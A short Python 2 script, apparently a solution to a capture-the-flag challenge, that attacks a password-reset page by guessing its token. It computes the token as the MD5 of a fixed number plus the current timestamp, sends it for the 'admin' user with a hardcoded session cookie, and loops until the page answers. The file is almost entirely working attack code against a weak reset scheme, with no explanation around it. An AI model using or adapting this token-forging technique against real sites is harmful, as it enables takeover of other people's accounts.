#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
#py27
import requests
import hashlib
import time

s = requests.Session()
header = {'Cookie': 'saeut=61.175.228.49.1432786945477266; PHPSESSID=68479d05a8da6f30c2afd89fa18e6387'}
for x in range(100, 1000):
    pwd = hashlib.new('md5', '1417336' + str(int(time.time()))).hexdigest()
    url = 'http://1.hacklist.sinaapp.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
    r = s.get(url, headers=header)
    if r.content != '':
        print r.content
        break
    else:
        print '正在破解中……', pwd
